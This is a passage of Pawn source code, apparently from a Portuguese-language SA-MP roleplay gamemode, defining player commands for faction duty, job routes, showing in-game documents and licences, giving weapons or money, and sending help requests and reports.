			    SetPlayerColor(playerid, COLOR_WHITE);
			}
			default:
			{
			    PlayerActionMessage(playerid, 15.0, "tira o filho da puta do objeto, preparando-se para ir para o caralho mais velho.");
			    SetPlayerColor(playerid, COLOR_WHITE);
			}
		}
		
		switch(pInfo[playerid][FactionRank])
		{
		    case 1:
			{
				SetPlayerSkin(playerid, fInfo[pInfo[playerid][Faction]][SkinRank1]);
			}
		    case 2:
		    {
		        SetPlayerSkin(playerid, fInfo[pInfo[playerid][Faction]][SkinRank2]);
		    }
		    case 3:
		    {
		        SetPlayerSkin(playerid, fInfo[pInfo[playerid][Faction]][SkinRank3]);
		    }
		    case 4:
		    {
		        SetPlayerSkin(playerid, fInfo[pInfo[playerid][Faction]][SkinRank4]);
		    }
		    case 5:
		    {
		        SetPlayerSkin(playerid, fInfo[pInfo[playerid][Faction]][SkinRank5]);
		    }
		    case 6:
		    {
		        SetPlayerSkin(playerid, fInfo[pInfo[playerid][Faction]][SkinRank6]);
		    }
		}

		SendClientMessage(playerid, COLOR_CHAT, "[FACTION:] {FFFFFF}Estás agora em serviço");

		FactionDuty[playerid] = true;
	}
	else
	{
		switch(fInfo[pInfo[playerid][Faction]][Type])
		{
			case F_POLICIA:
			{
	            PlayerActionMessage(playerid, 15.0, "abre o cacifo e coloca a farda e as armas lá dentro.");
	            SetPlayerColor(playerid, COLOR_WHITE);
	            
				ResetPlayerWeapons(playerid);
			}
			case F_MEDICOS:
			{
			    PlayerActionMessage(playerid, 15.0, "tira a roupa de civil do cacifo e veste-a.");
			    SetPlayerColor(playerid, COLOR_WHITE);
			}
			case F_MECANICOS:
			{
			    PlayerActionMessage(playerid, 15.0, "tira a roupa de civil do cacifo e veste-a.");
			    SetPlayerColor(playerid, COLOR_WHITE);
			}
			case F_NEWS:
			{
			    PlayerActionMessage(playerid, 15.0, "guarda a câmara e o bloco de notas na gaveta.");
			    SetPlayerColor(playerid, COLOR_WHITE);
			}
			case F_GOVERNO:
			{
			    PlayerActionMessage(playerid, 15.0, "abre o cacifo, veste a roupa à civil e guarda as armas.");
			    SetPlayerColor(playerid, COLOR_WHITE);
			}
			case F_DROGAS:
			{
                PlayerActionMessage(playerid, 15.0, "guarda a droga no esconderijo.");
                SetPlayerColor(playerid, COLOR_WHITE);
			}
			case F_MAFIA:
			{
                PlayerActionMessage(playerid, 15.0, "guarda as armas no esconderijo.");
                SetPlayerColor(playerid, COLOR_WHITE);
			}
			case F_SR:
			{
			    SetPlayerColor(playerid, COLOR_WHITE);
			}
			default:
			{
			    PlayerActionMessage(playerid, 15.0, "abre a puta da gaveta e mete lá o caralho que te foda.");
			    SetPlayerColor(playerid, COLOR_WHITE);
			}
		}
		
		SetPlayerSkin(playerid, pInfo[playerid][Skin]);

		SendClientMessage(playerid, COLOR_CHAT, "[FACTION:] {FFFFFF}Estás agora fora de serviço");

		FactionDuty[playerid] = false;
	}

	return 1;
}

COMMAND:deixaremprego(playerid, params[], help)
{
	if(pInfo[playerid][Emprego] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás desempregado");
	if(pInfo[playerid][Faction] != 0)
	{
		if(fInfo[pInfo[playerid][Faction]][Legal] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás numa faction legal");
	}

	if(pInfo[playerid][Rotas] <= 9) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Precisas de 9 rotas no teu trabalho atual para o abandonares");
	
	pInfo[playerid][Emprego] = 0;
	
	SendClientMessage(playerid, COLOR_CHAT, "[CENTRO DE EMPREGO:] {FFFFFF}Deixaste o teu emprego!");

	return 1;
}
/*
1: Agricultor
3: Autocarros
4: Transportadores de Cereais
5: Carteiro
6: Lixeiros X
7: Transportador de Produtos X
8: Cimenteiro
9: Limpa Ruas X
10: Lenhador
11: Transportador de Gasolina
12: Transportador de Dinheiro
*/

COMMAND:rota(playerid, params[], help)
{
	if(pInfo[playerid][Emprego] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás desempregado");
	if(pInfo[playerid][Faction] != 0)
	{
		if(fInfo[pInfo[playerid][Faction]][Legal] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás numa faction legal");
	}
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new car = GetPlayerVehicleID(playerid);
	new string[128];

	if(cInfo[car][Type] != pInfo[playerid][Emprego])
	{
		format(string, sizeof(string), "[ERRO:] {FFFFFF}Esse carro não pertence ao emprego %s", jInfo[pInfo[playerid][Emprego]][Nome]);
		return SendClientMessage(playerid, COLOR_ERRO, string);
	}

	switch(pInfo[playerid][Emprego])
	{
		case 1: // autocarros
		{
            SetPlayerCheckpoint(playerid, 2302.164550, -2313.772949, 13.104313, 5.0);
			RotaJob1[playerid] = 2;

			RotaMensagem(playerid, "Transporta os cidadãos pela cidade");
		}
		case 2: // carteiro
		{
            SetPlayerCheckpoint(playerid, 1082.8176, -1714.8239, 13.1099, 5.0);
			RotaJob2[playerid] = 2;

			RotaMensagem(playerid, "Entrega o correio");
		}
		case 3: // lixeiros
		{
			SetPlayerCheckpoint(playerid, 1385.361328, -1650.963867, 13.107112, 5.0);
			RotaJob3[playerid] = 2;

			RotaMensagem(playerid, "Recolhe o lixo por toda a cidade");
		}
		case 4: // trans produtos
		{
			SetPlayerCheckpoint(playerid, 1747.270385, -1707.112915, 13.109888, 5.0);
			RotaJob4[playerid] = 2;

			RotaMensagem(playerid, "Vai buscar produtos à zona industrial");
		}
		case 5: // cimenteiro
		{
            SetPlayerCheckpoint(playerid, 1034.237915, -2056.495117, 12.687504, 5.0);
			RotaJob5[playerid] = 2;

			RotaMensagem(playerid, "Transporta o cimento até às obras");
		}
		case 6: // limpa ruas
		{
			SetPlayerCheckpoint(playerid, 1643.367309, -1870.176025, 13.109886, 5.0);
			RotaJob6[playerid] = 2;

			RotaMensagem(playerid, "Limpa as ruas da cidade");
		}
		case 7: // lenhador
		{
            SetPlayerCheckpoint(playerid, 1555.657470, -2192.248046, 13.102080, 5.0);
			RotaJob7[playerid] = 2;

			RotaMensagem(playerid, "Transporta a madeira pela cidade");
		}
		case 8: // trans gasolina
		{
            SetPlayerCheckpoint(playerid, 1657.500732, -1735.088500, 13.109888, 5.0);
           	RotaJob8[playerid] = 2;

			RotaMensagem(playerid, "Abastece a cidade de combustível");
		}
		case 9: // trans dinheiro
		{
            SetPlayerCheckpoint(playerid, 506.969055, -1445.861083, 14.641747, 5.0);
           	RotaJob9[playerid] = 2;

			RotaMensagem(playerid, "Transporta as notas até ao banco");
		}
	}

	return 1;
}
		
COMMAND:creditos(playerid, params[], help)
{
	SendClientMessage(playerid, COLOR_ORANGE, "_______________________________[ CRÉDITOS ]_______________________________");
	SendClientMessage(playerid, COLOR_CHAT, "Gamemode: bruxo");
	SendClientMessage(playerid, COLOR_CHAT, "Mapping: Snowie");
	SendClientMessage(playerid, COLOR_CHAT, "Interiores: goviscrap, J4mmyHD, PatrickChucky, KiLLAMANiTALY");
	SendClientMessage(playerid, COLOR_CHAT, "Includes & Plugins: Zeex, Incognito, d0, OstGot, Y_Less, Double-O-Seven, Lós, Gammix");
	SendClientMessage(playerid, COLOR_ORANGE, "__________________________________________________________________________");

	return 1;
}

COMMAND:mostrarcc(playerid, params[], help)
{
	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/mostrarcc <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");

	format(string, sizeof(string), "Mostras-te o teu Cartão de Cidadão a %s", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_WHITE, string);
	SendClientMessage(giveplayerid, COLOR_CHAT, "_______________________________[ CARTÃO DE CIDADÃO ]_______________________________");
	format(string, sizeof(string), "Nome: {FFFFFF}%s", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Cartão número: {FFFFFF}%d", pInfo[playerid][CC]);
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Idade: {FFFFFF}%d", pInfo[playerid][Idade]);
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	if(pInfo[playerid][Emprego] != 0)
	{
		format(string, sizeof(string), "Emprego: {FFFFFF}%s", jInfo[pInfo[playerid][Emprego]][Nome]);
		SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	}
	else
	{
		SendClientMessage(giveplayerid, COLOR_ORANGE, "Emprego: {FFFFFF}Nenhum");
	}
	SendClientMessage(playerid, COLOR_CHAT, "______________________________________________________________________________________");

	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "mostra o cartão de cidadão a");
	
	if(!IsAmigo(giveplayerid, playerid) && playerid != giveplayerid)
	{
		VirarAmigo(giveplayerid, playerid);
		ShowPlayerNameTagForPlayer(playerid, giveplayerid, true);
	}

	return 1;
}

COMMAND:mostrardocumentoscarro(playerid, params[], help)
{
	new giveplayerid, chave, car, string[128];

	if(IsPlayerInAnyVehicle(playerid))
	{
		car = GetPlayerVehicleID(playerid);
		
		if(cInfo[car][Type] == -1) // pessoal
		{
  			goto CHAVEPESSOAL;
		}
		else if(cInfo[car][Type] == -2) // faction
		{
			if(cInfo[car][Faction] != pInfo[playerid][Faction])
			{
				SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não pertences a essa faction!");

				return 1;
			}
			else
			{
			    goto CARROJOB;
			}
		}
		else if(cInfo[car][Type] > 0) // empregos
		{
			if(pInfo[playerid][Emprego] != cInfo[car][Type])
			{
				SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não pertences a esse emprego!");
				
				return 1;
			}
			else
			{
			    goto CARROJOB;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Fudeu completamente. Chama o bruxo e dá este código: 0x001");
			return 1;
		}
	}
	else
	{
	    goto CHAVEPESSOAL;
	}
	
    
	CARROJOB:
	{
 		if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	   	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	   	
		format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(car));
		SendClientMessage(giveplayerid, COLOR_CHAT, string);
		format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[car][Prop]);
		SendClientMessage(giveplayerid, COLOR_ORANGE, string);
		format(string, sizeof(string), "Modelo: {FFFFFF}%s", GetStandName(car));
		SendClientMessage(giveplayerid, COLOR_ORANGE, string);
		format(string, sizeof(string), "Comprado em: {FFFFFF}%s", cInfo[car][CompradoEm]);
		SendClientMessage(giveplayerid, COLOR_ORANGE, string);
		SendClientMessage(playerid, COLOR_CHAT, "______________________________________________________________________________________________");
	}
    
    
    CHAVEPESSOAL:
    {
	   	if(sscanf(params, "dd", giveplayerid, chave)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/mostardocumentoscarro <playerid> <chave>");
	    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	   	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
		if(chave <= 0 || chave > 8) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave inválida");
		switch(chave)
		{
			case 1:
			{
				if(pInfo[playerid][ChaveCarro1] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum carro na chave 1");

				format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(pInfo[playerid][ChaveCarro1]));
				SendClientMessage(giveplayerid, COLOR_CHAT, string);
				format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarro1]][Prop]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Modelo: {FFFFFF}%s", GetStandName(GetVehicleModel(pInfo[playerid][ChaveCarro1])));
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Comprado em: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarro1]][CompradoEm]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
			}
			case 2:
			{
				if(pInfo[playerid][ChaveCarro2] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum carro na chave 2");

	            format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(pInfo[playerid][ChaveCarro2]));
				format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarro2]][Prop]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	           	SendClientMessage(giveplayerid, COLOR_CHAT, string);
				format(string, sizeof(string), "Modelo: {FFFFFF}%s", GetStandName(GetVehicleModel(pInfo[playerid][ChaveCarro2])));
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Comprado em: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarro2]][CompradoEm]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
			}
			case 3:
			{
				if(pInfo[playerid][ChaveCarro3] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum carro na chave 3");

				format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(pInfo[playerid][ChaveCarro3]));
	            SendClientMessage(giveplayerid, COLOR_CHAT, string);
				format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarro3]][Prop]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Modelo: {FFFFFF}%s", GetStandName(GetVehicleModel(pInfo[playerid][ChaveCarro3])));
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Comprado em: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarro3]][CompradoEm]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
			}
			case 4:
			{
				if(pInfo[playerid][ChaveCarro4] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum carro na chave 4");

				format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(pInfo[playerid][ChaveCarro4]));
				SendClientMessage(giveplayerid, COLOR_CHAT, string);
				format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarro4]][Prop]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Modelo: {FFFFFF}%s", GetStandName(GetVehicleModel(pInfo[playerid][ChaveCarro4])));
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	  			format(string, sizeof(string), "Comprado em: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarro4]][CompradoEm]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
			}
			case 5:
			{
				if(pInfo[playerid][ChaveCarroEmp1] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum carro na chave 5");

				format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(pInfo[playerid][ChaveCarroEmp1]));
				SendClientMessage(giveplayerid, COLOR_CHAT, string);
				format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarroEmp1]][Prop]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Modelo: {FFFFFF}%s", GetStandName(GetVehicleModel(pInfo[playerid][ChaveCarroEmp1])));
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Comprado em: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarroEmp1]][CompradoEm]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
			}
			case 6:
			{
				if(pInfo[playerid][ChaveCarroEmp2] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum carro na chave 6");

				format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(pInfo[playerid][ChaveCarroEmp2]));
				SendClientMessage(giveplayerid, COLOR_CHAT, string);
				format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarroEmp2]][Prop]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Modelo: {FFFFFF}%s", GetStandName(GetVehicleModel(pInfo[playerid][ChaveCarroEmp2])));
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Comprado em: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarroEmp2]][CompradoEm]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
			}
			case 7:
			{
				if(pInfo[playerid][ChaveCarroEmp3] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum carro na chave 7");

				format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(pInfo[playerid][ChaveCarroEmp3]));
				SendClientMessage(giveplayerid, COLOR_CHAT, string);
				format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarroEmp3]][Prop]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Modelo: {FFFFFF}%s", GetStandName(GetVehicleModel(pInfo[playerid][ChaveCarroEmp3])));
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Comprado em: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarroEmp3]][CompradoEm]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
			}
			case 8:
			{
				if(pInfo[playerid][ChaveCarroEmp4] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum carro na chave 8");

				format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(pInfo[playerid][ChaveCarroEmp4]));
				SendClientMessage(giveplayerid, COLOR_CHAT, string);
				format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarroEmp4]][Prop]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Modelo: {FFFFFF}%s", GetStandName(GetVehicleModel(pInfo[playerid][ChaveCarroEmp4])));
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
				format(string, sizeof(string), "Comprado em: {FFFFFF}%s", cInfo[pInfo[playerid][ChaveCarroEmp4]][CompradoEm]);
				SendClientMessage(giveplayerid, COLOR_ORANGE, string);
			}
		}

		SendClientMessage(giveplayerid, COLOR_CHAT, "______________________________________________________________________________________________");
    }
    
	
	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "mostra os documentos do veículo a");
	
	return 1;
}

COMMAND:mostrarseguro(playerid, params[], help)
{
	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/mostrarseguro <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");

	format(string, sizeof(string), "Mostraste o teu seguro a %s", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_WHITE, string);
	
	if(pInfo[playerid][Seguradora] == 0)
	{
		format(string, sizeof(string), "O jogador %s não tem seguro!", GetPlayerNameEx(giveplayerid));
		SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	}
	else
	{
		format(string, sizeof(string), "_______________________________[ SEGURADORA %s ]_______________________________", bInfo[pInfo[playerid][Seguradora]][Nome]);
		SendClientMessage(giveplayerid, COLOR_CHAT, string);
		format(string, sizeof(string), "Titular da conta: {FFFFFF}%s", GetPlayerNameEx(playerid));
		SendClientMessage(giveplayerid, COLOR_ORANGE, string);
		format(string, sizeof(string), "Mensalidade: {FFFFFF}%d$ p/mês", pInfo[playerid][MensalidadeSeguradora]);
		SendClientMessage(giveplayerid, COLOR_ORANGE, string);
		format(string, sizeof(string), "Meses sem reparação: {FFFFFF}%d", pInfo[playerid][SeguradoraPayCount]);
		SendClientMessage(giveplayerid, COLOR_ORANGE, string);
		SendClientMessage(giveplayerid, COLOR_CHAT, "_________________________________________________________________________________________");
	}

	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "mostra a papelada do seguro a");

	if(!IsAmigo(giveplayerid, playerid) && playerid != giveplayerid)
	{
		VirarAmigo(giveplayerid, playerid);
		ShowPlayerNameTagForPlayer(playerid, giveplayerid, true);
	}

	return 1;
}

COMMAND:mostrarlicencas(playerid, params[], help)
{
	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/mostrarlicenças <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");

	new Lig_A[8], Mota_A[8], Pesados_A[8], Barco_A[8], Armas_A[8], Pesca_A[8];

	format(string, sizeof(string), "Mostraste todas as tuas licenças a %s", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_WHITE, string);
	
	if(pInfo[playerid][CartaLig] == 1)
	{
	    Lig_A = "Sim";
	}
	else
	{
		Lig_A = "Não";
	}
	if(pInfo[playerid][CartaMota] == 1)
	{
	    Mota_A = "Sim";
	}
	else
	{
		Mota_A = "Não";
	}
	if(pInfo[playerid][CartaPesados] == 1)
	{
	    Pesados_A = "Sim";
	}
	else
	{
		Pesados_A = "Não";
	}
	if(pInfo[playerid][CartaBarco] == 1)
	{
	    Barco_A = "Sim";
	}
	else
	{
		Barco_A = "Não";
	}
	if(pInfo[playerid][LicArmas] == 1)
	{
	    Armas_A = "Sim";
	}
	else
	{
		Armas_A = "Não";
	}
	if(pInfo[playerid][LicPesca] == 1)
	{
	    Pesca_A = "Sim";
	}
	else
	{
		Pesca_A = "Não";
	}
	
	format(string, sizeof(string), "_______________________________[ LICENÇAS DE %s ]_______________________________", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Carta de Ligeiros: {FFFFFF}%s", Lig_A);
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Carta de Motociclos: {FFFFFF}%s", Mota_A);
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Carta de Pesados: {FFFFFF}%s", Pesados_A);
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Carta de Barco: {FFFFFF}%s", Barco_A);
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Pesca: {FFFFFF}%s", Pesca_A);
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Uso e porte de arma: {FFFFFF}%s", Armas_A);
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	SendClientMessage(giveplayerid, COLOR_CHAT, "_____________________________________________________________________________________________");

	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "mostra as licenças a");

	if(!IsAmigo(giveplayerid, playerid) && playerid != giveplayerid)
	{
		VirarAmigo(giveplayerid, playerid);
		ShowPlayerNameTagForPlayer(playerid, giveplayerid, true);
	}

	return 1;
}

COMMAND:dararma(playerid, params[], help)
{
	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/dararma <playerid>");
    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes dar armas a ti próprio!");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(GetPlayerScore(giveplayerid) < 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nível insuficiente");
	
 	new armaID = GetPlayerWeapon(playerid);
	new armaMun = GetPlayerAmmo(playerid);
	
 	if(armaID == 0 && armaMun == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma na não!");

	GivePlayerWeapon(giveplayerid, armaID, armaMun);
 	RemovePlayerWeapon(playerid, armaID);

	format(string, sizeof(string), "Entregaste a tua arma ao jogador %d", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "O jogador %s entregou-te a arma dele", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_WHITE, string);

	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "pega na sua arma, tranca-a e entrega-a a");

	return 1;
}

COMMAND:pagar(playerid, params[], help)
{
	new giveplayerid, montante, string[128];

    if(sscanf(params, "dd", giveplayerid, montante)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/pagar <playerid> <montante>");
    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes dar dinheiro a ti próprio!");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(montante <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");
	if(GetPlayerMoneyEx(playerid) < montante) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse dinheiro");
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(GetPlayerScore(giveplayerid) < 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nível insuficiente");
    
	GivePlayerMoneyEx(playerid, -montante);
	GivePlayerMoneyEx(giveplayerid, montante);
	
	format(string, sizeof(string), "Pagaste %d$ ao jogador %s", montante, GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Recebeste %d$ do jogador %s", montante, GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_WHITE, string);
	
	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "pega em algumas notas e entrega-as a");

	return 1;
}

COMMAND:ajuda(playerid, params[], help)
{
	new ajuda[65], string[128];

    if(sscanf(params, "s[64]", ajuda)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajuda <mensagem>");
    
	foreach(new i : Player)
	{
		// if(!IsPlayerConnected(i)) continue;
		if(AdminDuty[i] == false) continue;

		format(string, sizeof(string), "{4C99D9}[AJUDAS:] {FFFFFF}%s (ID:%d): {D6CB85}%s", GetPlayerNameEx(playerid), playerid, ajuda);
		SendClientMessage(i, COLOR_OWNER, string);
	}
	
	SendClientMessage(playerid, COLOR_CHAT, "Pedido de ajuda enviado");
	
	sStats[0][Ajudas]++;

	return 1;
}

COMMAND:report(playerid, params[], help)
{
	new giveplayerid, reason[65], string[128];

    if(sscanf(params, "ds[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/report <playerid> <razão>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	foreach(new i : Player)
	{
		// if(!IsPlayerConnected(i)) continue;
		if(AdminDuty[i] == false) continue;

		format(string, sizeof(string), "{4C99D9}[REPORTS:] {FFFFFF}%s reportou %s (ID:%d). Razão: %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), giveplayerid, reason);
		SendClientMessage(i, COLOR_OWNER, string);
	}

	SendClientMessage(playerid, COLOR_CHAT, "Report enviado");

	return 1;
}

COMMAND:atestar(playerid, params[], help)
{
	if(IsAtGasStation(playerid) == -1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás numa Bomba de Gasolina.");
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
	
	new gasid = IsAtGasStation(playerid);
